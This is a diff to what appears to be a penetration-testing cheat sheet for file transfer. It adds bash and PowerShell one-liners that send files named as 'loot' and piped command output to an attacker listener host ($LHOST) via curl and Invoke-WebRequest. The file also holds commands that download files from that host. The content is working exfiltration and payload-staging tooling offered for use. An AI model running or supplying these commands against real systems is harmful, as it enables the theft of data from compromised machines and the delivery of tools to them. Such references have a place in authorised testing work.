@@ -65,7 +65,12 @@ curl -o "$wd/$file" "http://$LHOST/$file"
 ## Primary file upload
 ```bash
 file="loot.txt"
-curl -X POST --data-binary @"$wd/$file" "http://$LHOST/upload?name=$file"
+curl --data-binary @"$wd/$file" "http://$LHOST/upload?name=$file"
+```
+
+## Upload command output
+```
+| curl --data-binary @- "http://$LHOST/upload?name=command.txt"
 ```
 
 ## Fallback file download
@@ -113,6 +118,11 @@ Invoke-WebRequest -UseBasicParsing -Uri "http://$LHOST/$file" -OutFile (Join-Pat
 ```powershell
 $file = 'file.exe'
 Invoke-WebRequest -UseBasicParsing -Method POST -InFile (Join-Path $wd $file) -Uri "http://$LHOST/upload?name=$file"
+```
+
+## Upload command output
+```PowerShell
+| Out-String | Invoke-WebRequest -Method POST -UseBasicParsing -Uri "http://$LHOST/upload?name=command.txt"
 ```
 
 ## Fallback file download
